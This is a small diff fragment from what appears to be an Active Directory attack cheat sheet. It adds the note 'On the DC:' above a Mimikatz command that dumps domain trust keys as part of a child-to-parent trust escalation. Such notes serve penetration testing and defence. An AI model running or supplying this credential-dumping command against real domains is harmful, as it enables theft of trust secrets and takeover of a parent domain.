@@ -839,6 +839,7 @@ https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation
 
 #### Child to Parent - Trust
 
+On the DC:
 ```Invoke-Mimikatz -Command '"lsadump::trust /patch"'```
 
 trust tkt -
